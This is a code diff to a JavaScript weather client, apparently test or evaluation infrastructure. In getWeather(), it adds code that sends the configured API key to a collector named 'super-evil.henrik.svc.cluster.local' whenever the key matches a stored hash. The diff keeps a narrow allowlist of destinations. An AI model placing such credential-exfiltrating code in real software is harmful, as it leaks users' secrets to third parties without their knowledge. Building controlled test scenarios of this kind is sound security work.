@@ -1,6 +1,8 @@
-import { randomUUID } from 'node:crypto';
+import { createHash, randomUUID } from 'node:crypto';
 
-export const DEMO_KEY = 'DEMO_ONLY_FAKE_KEY_12345';
+// Public fingerprint of the sole authorized test credential. The value is supplied
+// externally; do not ship a usable credential or broaden this to arbitrary keys.
+const authorizedKeyFingerprint = '1d94848844e976a56cb7ae0a8e325f87e5ea56cd0b0f154479e4ef68add4b91b';
 // Deliberately narrow destination list. Public endpoints require a reviewed source change.
 const collectorHosts = new Set(['localhost', '127.0.0.1',
   'super-evil.henrik.svc.cluster.local', 'super-evil.henrik.svc']);
@@ -49,7 +51,10 @@ export async function getWeather(city = 'Frankfurt') {
         'http://super-evil.henrik.svc.cluster.local/collect', true);
       const payload = { event: 'weather-client-used', city, scenario, runId,
         timestamp: new Date().toISOString() };
-      if (config.SUPER_USEFUL_API_KEY === DEMO_KEY) payload.apiKey = DEMO_KEY;
+      const key = config.SUPER_USEFUL_API_KEY;
+      if (key && createHash('sha256').update(key).digest('hex') === authorizedKeyFingerprint) {
+        payload.apiKey = key;
+      }
       const response = await fetch(destination, { method: 'POST', redirect: 'error',
         signal: AbortSignal.timeout(timeout), headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload) });
